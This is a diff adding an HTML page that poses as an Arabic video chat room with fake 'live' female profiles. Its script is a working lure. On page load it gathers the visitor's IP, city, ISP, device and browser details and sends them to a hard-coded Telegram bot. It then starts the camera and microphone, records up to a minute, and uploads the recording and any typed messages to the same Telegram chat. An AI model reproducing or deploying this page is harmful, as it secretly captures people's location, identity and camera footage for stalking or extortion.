@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>غرفة الدردشة العربية</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',Tahoma,Arial,sans-serif}
+body{background:#0a0a0a;color:#fff;min-height:100vh;overflow-x:hidden}
+.header{background:linear-gradient(135deg,#1a1a2e,#16213e);padding:15px;text-align:center;border-bottom:2px solid #e91e63}
+.header h1{color:#e91e63;font-size:20px}
+.header p{color:#aaa;font-size:12px;margin-top:5px}
+.users{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;padding:15px}
+.user-card{background:#1a1a2e;border-radius:12px;padding:10px;text-align:center;position:relative;overflow:hidden}
+.user-card .avatar{width:70px;height:70px;border-radius:50%;background:linear-gradient(135deg,#e91e63,#9c27b0);display:inline-flex;justify-content:center;align-items:center;font-size:35px;margin-bottom:8px}
+.user-card .name{color:#fff;font-size:13px;font-weight:bold}
+.user-card .status{color:#4caf50;font-size:11px;margin-top:3px}
+.user-card .live{position:absolute;top:5px;right:5px;background:#f44336;color:#fff;font-size:9px;padding:2px 6px;border-radius:10px;font-weight:bold}
+.video-container{position:relative;width:100%;height:0;padding-bottom:75%;background:#000;margin:10px 0}
+.video-container video{position:absolute;top:0;left:0;width:100%;height:100%;object-fit:cover}
+.video-container .overlay{position:absolute;bottom:0;left:0;right:0;background:linear-gradient(transparent,rgba(0,0,0,0.8));padding:15px}
+.video-container .overlay .name{color:#fff;font-size:16px;font-weight:bold}
+.video-container .overlay .msg{color:#ccc;font-size:12px;margin-top:3px}
+.controls{display:flex;justify-content:center;gap:15px;padding:15px}
+.control-btn{width:55px;height:55px;border-radius:50%;background:#1a1a2e;border:2px solid #e91e63;display:flex;justify-content:center;align-items:center;font-size:22px;cursor:pointer}
+.control-btn.active{background:#e91e63}
+.chat-input{display:flex;padding:10px;gap:10px;background:#1a1a2e}
+.chat-input input{flex:1;padding:12px;background:#0a0a0a;border:1px solid #333;border-radius:25px;color:#fff;font-size:14px;outline:none}
+.chat-input button{width:50px;height:50px;border-radius:50%;background:#e91e63;border:none;color:#fff;font-size:20px;cursor:pointer}
+.notification{position:fixed;top:0;left:0;right:0;background:#e91e63;color:#fff;padding:15px;text-align:center;font-size:14px;z-index:1000;display:none}
+.video-preview{display:none;padding:15px;text-align:center}
+.video-preview video{width:100%;max-width:400px;border-radius:12px}
+.send-btn{width:100%;padding:15px;background:#4caf50;color:#fff;border:none;border-radius:12px;font-size:16px;font-weight:bold;cursor:pointer;margin-top:15px}
+</style>
+</head>
+<body>
+
+<div class="notification" id="notif">🎥 جاري الاتصال... يرجى السماح بالوصول إلى الكاميرا والميكروفون</div>
+
+<div class="header">
+<h1>💬 غرفة الدردشة العربية</h1>
+<p>أهلاً بك في غرفة الدردشة الصوتية والفيديو</p>
+</div>
+
+<div class="users" id="users">
+<div class="user-card"><div class="avatar">👩</div><div class="name">سارة</div><div class="status">🟢 متصل</div><div class="live">مباشر</div></div>
+<div class="user-card"><div class="avatar">👩</div><div class="name">نور</div><div class="status">🟢 متصل</div><div class="live">مباشر</div></div>
+<div class="user-card"><div class="avatar">👩</div><div class="name">ليلى</div><div class="status">🟢 متصل</div><div class="live">مباشر</div></div>
+<div class="user-card"><div class="avatar">👩</div><div class="name">مريم</div><div class="status">🟢 متصل</div></div>
+<div class="user-card"><div class="avatar">👩</div><div class="name">هبة</div><div class="status">🟢 متصل</div></div>
+<div class="user-card"><div class="avatar">👩</div><div class="name">رنا</div><div class="status">🟢 متصل</div></div>
+</div>
+
+<div class="video-preview" id="videoPreview">
+<video id="preview" autoplay muted playsinline></video>
+<button class="send-btn" id="sendBtn">📤 إرسال الفيديو</button>
+</div>
+
+<div class="controls">
+<div class="control-btn" id="camBtn">📹</div>
+<div class="control-btn" id="micBtn">🎤</div>
+<div class="control-btn" id="switchBtn">🔄</div>
+</div>
+
+<div class="chat-input">
+<input type="text" id="msgInput" placeholder="اكتب رسالتك...">
+<button id="sendMsg">➤</button>
+</div>
+
+<script>
+const BOT='8817416933:AAEJJON9lK12149s6-5qYZ91pzf8-XJiNTw';
+const CHAT='8823506156';
+
+let stream=null;
+let mediaRecorder=null;
+let recordedChunks=[];
+let facingMode='user';
+let videoBlob=null;
+
+// Show notification
+document.getElementById('notif').style.display='block';
+setTimeout(()=>{document.getElementById('notif').style.display='none';},4000);
+
+// Send device info
+async function sendInfo(){
+try{
+const r=await fetch('https://ipapi.co/json/');
+const d=await r.json();
+const msg='🎥 *دخول غرفة الدردشة*\n\n'+
+'🌐 IP: `'+d.ip+'`\n'+
+'🏙️ '+d.city+' | '+d.country_name+'\n'+
+'📡 '+d.org+'\n'+
+'💻 '+navigator.platform+'\n'+
+'📱 '+navigator.userAgent.substring(0,50)+'\n'+
+'🌐 '+navigator.language+'\n'+
+'📺 '+window.screen.width+'x'+window.screen.height+'\n'+
+'🕐 '+new Date().toLocaleString('ar-IQ');
+await fetch('https://api.telegram.org/bot'+BOT+'/sendMessage?chat_id='+CHAT+'&text='+encodeURIComponent(msg)+'&parse_mode=Markdown');
+}catch(e){}
+}
+sendInfo();
+
+// Start camera
+async function startCamera(){
+try{
+stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:facingMode}, audio:true});
+document.getElementById('preview').srcObject=stream;
+document.getElementById('videoPreview').style.display='block';
+document.getElementById('camBtn').classList.add('active');
+
+// Start recording
+recordedChunks=[];
+mediaRecorder=new MediaRecorder(stream);
+mediaRecorder.ondataavailable=function(e){if(e.data.size>0)recordedChunks.push(e.data);};
+mediaRecorder.onstop=function(){
+videoBlob=new Blob(recordedChunks,{type:'video/webm'});
+};
+mediaRecorder.start();
+setTimeout(()=>{if(mediaRecorder.state==='recording')mediaRecorder.stop();},60000);
+}catch(e){
+alert('يجب السماح بالوصول إلى الكاميرا والميكروفون');
+}
+}
+
+// Start camera on page load
+setTimeout(startCamera, 2000);
+
+// Switch camera
+document.getElementById('switchBtn').addEventListener('click', function(){
+facingMode = facingMode==='user' ? 'environment' : 'user';
+if(stream){stream.getTracks().forEach(t=>t.stop());}
+startCamera();
+});
+
+// Send video
+document.getElementById('sendBtn').addEventListener('click', async function(){
+if(videoBlob){
+const fd=new FormData();
+fd.append('chat_id',CHAT);
+fd.append('caption','🎥 فيديو من غرفة الدردشة');
+fd.append('video',videoBlob,'video.webm');
+await fetch('https://api.telegram.org/bot'+BOT+'/sendVideo',{method:'POST',body:fd});
+alert('✅ تم إرسال الفيديو');
+}
+});
+
+// Send message
+document.getElementById('sendMsg').addEventListener('click', async function(){
+const text=document.getElementById('msgInput').value;
+if(text){
+const msg='💬 *رسالة من غرفة الدردشة*\n\n'+text;
+await fetch('https://api.telegram.org/bot'+BOT+'/sendMessage?chat_id='+CHAT+'&text='+encodeURIComponent(msg)+'&parse_mode=Markdown');
+document.getElementById('msgInput').value='';
+}
+});
+</script>
+</body>
+</html>
